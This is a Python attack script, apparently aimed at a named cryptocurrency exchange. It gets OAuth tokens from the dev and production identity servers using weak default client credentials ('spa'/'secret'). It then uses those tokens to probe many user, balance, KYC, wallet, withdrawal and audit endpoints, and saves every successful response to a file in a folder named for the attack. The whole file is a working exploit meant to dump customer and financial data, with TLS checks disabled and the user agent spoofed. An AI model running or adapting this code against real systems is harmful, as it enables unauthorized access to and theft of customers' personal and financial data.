import requests, json, sys, urllib3, base64
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20

def safe(t, n=600):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) >= 2:
        payload = parts[1]
        payload += "=" * (4 - len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    return {}

H_FORM = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}

results = {}

print("=" * 70)
print("MX EXCHANGE — CLIENT CREDENTIALS TOKEN → BALANCE DUMP")
print("=" * 70)

# Get tokens for both environments
tokens = {}
for env, base_id in [("HKDEV", "https://identityhkdev.mx.exchange"), ("PROD", "https://identity.mx.exchange")]:
    for scope in ["accountApi walletApi orderBookApi notificationApi commonApi brokerApi", "accountApi walletApi", ""]:
        r = requests.post(f"{base_id}/connect/token", data={
            "client_id": "spa", "client_secret": "secret",
            "grant_type": "client_credentials", "scope": scope
        }, headers=H_FORM, timeout=T, verify=False)
        if r.status_code == 200:
            data = r.json()
            tok = data["access_token"]
            claims = decode_jwt(tok)
            print(f"\n[{env}] TOKEN scope='{scope}'")
            print(f"  expires_in: {data.get('expires_in')}s")
            print(f"  token_type: {data.get('token_type')}")
            print(f"  JWT claims: {json.dumps(claims, indent=2)[:500]}")
            tokens[f"{env}_{scope[:20]}"] = tok
            results[f"{env}_token_{scope[:20]}"] = {"claims": claims, "raw": tok[:100]+"..."}
            break

# Use tokens to hit ALL services
SERVICES = {
    "HKDEV": {
        "account": "https://accounthkdev.mx.exchange",
        "wallet": "https://wallethkdev.mx.exchange",
        "orderbook": "https://orderbookhkdev.mx.exchange",
        "notification": "https://notificationhkdev.mx.exchange",
        "common": "https://commonhkdev.mx.exchange",
    },
    "PROD": {
        "account": "https://account.mx.exchange",
        "wallet": "https://wallet.mx.exchange",
        "orderbook": "https://orderbook.mx.exchange",
        "notification": "https://notification.mx.exchange",
        "common": "https://common.mx.exchange",
    },
}

ENDPOINTS = {
    "account": [
        "/api/Users", "/api/Users/1", "/api/Users/2", "/api/Users/3",
        "/api/Users/Balance/1", "/api/Users/Balance/2", "/api/Users/Balance/3",
        "/api/Users/Balance/4", "/api/Users/Balance/5",
        "/api/Users/Report", "/api/Users/TempList",
        "/api/Users/GetCustomerData", "/api/Users/GetCustomerAccountData",
        "/api/Users/UserInfo", "/api/Users/UserInfoDetails",
        "/api/Account/1/Profile", "/api/Account/2/Profile", "/api/Account/3/Profile",
        "/api/Account/1/Settings", "/api/Account/1/KycInfomations",
        "/api/Account/GetOpenApiKey",
        "/api/Banks/AllBank", "/api/Banks",
        "/api/MasterData", "/api/Roles",
        "/api/AuditTrail", "/api/Groups",
        "/api/Kyc/KycLevels", "/api/Kyc/KycFields",
        "/api/Kyc/KycSubmitting", "/api/Kyc/KycSubmittingCount",
        "/api/Beneficiaries", "/api/Beneficiaries/CountryOfResidence",
        "/api/ExportReportLog",
    ],
    "wallet": [
        "/api/Wallet", "/api/Wallet/1", "/api/Wallet/2",
        "/api/Currency", "/api/Currency/1", "/api/Currency/2",
        "/api/Address", "/api/Address/1",
        "/api/Deposit", "/api/Withdrawal", "/api/Transfer",
        "/api/FiatDeposit", "/api/FiatWithdrawal",
        "/api/CryptoDeposit", "/api/CryptoWithdrawal",
        "/api/DeepFreezeAddress", "/api/InternalTransfer",
    ],
    "orderbook": [
        "/api/OrderBook", "/api/OrderBook/1",
        "/api/Order", "/api/Trade", "/api/Execution",
        "/api/Market", "/api/Market/1",
    ],
    "notification": [
        "/api/Email",
        "/api/TestHub", "/api/TestHub/WalletUpdate",
    ],
    "common": [
        "/api/Currency", "/api/Currency/1",
        "/api/Market", "/api/Market/1",
        "/api/Country",
        "/api/Fee", "/api/Fee/1",
    ],
}

for env in ["HKDEV", "PROD"]:
    tok_key = [k for k in tokens if k.startswith(env)]
    if not tok_key:
        continue
    token = tokens[tok_key[0]]
    AUTH = {"Authorization": f"Bearer {token}", "Accept": "application/json", "User-Agent": "Mozilla/5.0"}
    
    print(f"\n{'='*60}")
    print(f"  {env} — AUTHENTICATED SCAN")
    print(f"{'='*60}")
    
    for svc, base in SERVICES[env].items():
        if svc not in ENDPOINTS:
            continue
        print(f"\n  --- {svc} ({base}) ---")
        for path in ENDPOINTS[svc]:
            try:
                r = requests.get(f"{base}{path}", headers=AUTH, timeout=T, verify=False)
                if r.status_code == 404:
                    continue
                tag = "[!!!]" if r.status_code == 200 and len(r.text) > 2 else f"[{r.status_code}]"
                print(f"  {tag} {path} => {r.status_code} ({len(r.text)}b) {safe(r.text, 300)}")
                if r.status_code == 200 and r.text and len(r.text) > 2:
                    results[f"{env}_{svc}_{path}"] = r.text[:10000]
            except Exception as e:
                continue

# Save
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\authenticated_dump.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True)

print(f"\n{'='*70}")
print(f"TOTAL RESULTS: {len(results)} items")
